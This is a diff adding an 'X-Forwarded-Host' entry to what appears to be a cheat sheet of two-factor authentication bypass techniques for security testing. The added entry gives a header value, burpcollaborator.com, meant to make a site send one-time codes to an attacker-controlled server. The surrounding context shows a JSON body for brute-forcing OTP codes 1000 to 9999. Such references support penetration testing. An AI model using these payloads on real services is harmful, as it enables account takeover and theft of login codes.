@@ -21,6 +21,7 @@
 18. [Permanent Denial of Service (DoS) on Accounts](#18-permanent-denial-of-service-dos-on-accounts)
 19. [Authenticated Actions Without 2FA](#19-authenticated-actions-without-2fa)
 20. [Bulk OTP Testing in JSON](#20-bulk-otp-testing-in-json)
+21. [X-Forwarded-Host](#X-Forwarded-Host)
 
 ---
 
@@ -95,3 +96,9 @@
     "code": ["1000", "1001", "1002", ..., "9999"]
   }
   ```
+## 21. X-Forwarded-Host
+Using this header may send otp to attacker controlled server.
+```
+X-Forwarded-Host: burpcollaborator.com
+```
+---
